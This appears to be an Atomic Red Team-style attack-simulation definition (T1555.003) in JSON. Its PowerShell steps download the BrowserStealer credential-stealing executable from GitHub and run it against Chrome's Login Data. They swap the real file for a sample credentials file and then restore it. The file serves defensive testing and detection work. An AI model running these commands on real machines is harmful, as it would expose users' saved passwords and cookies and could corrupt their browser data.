{
  "id": "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd",
  "name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)",
  "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "80120521-03ca-430b-9813-f2446f1c4d25",
      "type": "execute-command",
      "data": {
        "command": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" \u003e $null\nRemove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" \u003e $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" \u003e $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n.\\BrowserCollector.exe\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "72060a2a-617d-48be-8848-ebe549fc9913",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" \u003e $null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" \u003e $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" \u003e $null\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "7f95dd7f-d383-4368-86ce-1290e2075c3d",
      "name": "Check dependency 1/3",
      "description": "Google Chrome must be on the device.\n",
      "type": "execute-command",
      "data": {
        "command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1a98a70a-b76a-4bb6-90ac-a9335f113642",
      "name": "Resolve dependency 1/3",
      "description": "Google Chrome must be on the device.\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0f0fd66f-827f-42b2-b743-485b926ba375",
      "name": "Re-check dependency 1/3",
      "description": "Google Chrome must be on the device.\n",
      "type": "execute-command",
      "data": {
        "command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9ae6f85a-22a1-46fa-bfda-5ce9bde3c9f0",
      "name": "Check dependency 2/3",
      "description": "BrowserCollector must exist in the bin directory\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "bb511eb3-f70b-4d9a-b3ec-2278b79137bf",
      "name": "Resolve dependency 2/3",
      "description": "BrowserCollector must exist in the bin directory\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\"",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0cfc142f-01b2-4a56-a407-53f957d2ca9f",
      "name": "Re-check dependency 2/3",
      "description": "BrowserCollector must exist in the bin directory\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3aa40966-9762-4726-9b56-ffdea4e86169",
      "name": "Check dependency 3/3",
      "description": "Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\") {exit 0} else {exit 1}",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6f280e78-bb60-4033-a801-fef62467e9da",
      "name": "Resolve dependency 3/3",
      "description": "Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/Login%20Data?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\"",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9b5463cb-5e66-44e7-82a3-020a5e98c2df",
      "name": "Re-check dependency 3/3",
      "description": "Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\") {exit 0} else {exit 1}",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "80120521-03ca-430b-9813-f2446f1c4d25",
      "p": "on-success",
      "o": "72060a2a-617d-48be-8848-ebe549fc9913"
    },
    {
      "s": "80120521-03ca-430b-9813-f2446f1c4d25",
      "p": "on-failure",
      "o": "72060a2a-617d-48be-8848-ebe549fc9913"
    },
    {
      "s": "7f95dd7f-d383-4368-86ce-1290e2075c3d",
      "p": "on-success",
      "o": "80120521-03ca-430b-9813-f2446f1c4d25"
    },
    {
      "s": "7f95dd7f-d383-4368-86ce-1290e2075c3d",
      "p": "on-failure",
      "o": "1a98a70a-b76a-4bb6-90ac-a9335f113642"
    },
    {
      "s": "1a98a70a-b76a-4bb6-90ac-a9335f113642",
      "p": "on-success",
      "o": "0f0fd66f-827f-42b2-b743-485b926ba375"
    },
    {
      "s": "0f0fd66f-827f-42b2-b743-485b926ba375",
      "p": "on-failure",
      "o": "80120521-03ca-430b-9813-f2446f1c4d25"
    },
    {
      "s": "9ae6f85a-22a1-46fa-bfda-5ce9bde3c9f0",
      "p": "on-success",
      "o": "80120521-03ca-430b-9813-f2446f1c4d25"
    },
    {
      "s": "9ae6f85a-22a1-46fa-bfda-5ce9bde3c9f0",
      "p": "on-failure",
      "o": "bb511eb3-f70b-4d9a-b3ec-2278b79137bf"
    },
    {
      "s": "bb511eb3-f70b-4d9a-b3ec-2278b79137bf",
      "p": "on-success",
      "o": "0cfc142f-01b2-4a56-a407-53f957d2ca9f"
    },
    {
      "s": "0cfc142f-01b2-4a56-a407-53f957d2ca9f",
      "p": "on-failure",
      "o": "80120521-03ca-430b-9813-f2446f1c4d25"
    },
    {
      "s": "3aa40966-9762-4726-9b56-ffdea4e86169",
      "p": "on-success",
      "o": "80120521-03ca-430b-9813-f2446f1c4d25"
    },
    {
      "s": "3aa40966-9762-4726-9b56-ffdea4e86169",
      "p": "on-failure",
      "o": "6f280e78-bb60-4033-a801-fef62467e9da"
    },
    {
      "s": "6f280e78-bb60-4033-a801-fef62467e9da",
      "p": "on-success",
      "o": "9b5463cb-5e66-44e7-82a3-020a5e98c2df"
    },
    {
      "s": "9b5463cb-5e66-44e7-82a3-020a5e98c2df",
      "p": "on-failure",
      "o": "80120521-03ca-430b-9813-f2446f1c4d25"
    }
  ],
  "tags": [
    "T1555.003",
    "atomic-red-team"
  ]
}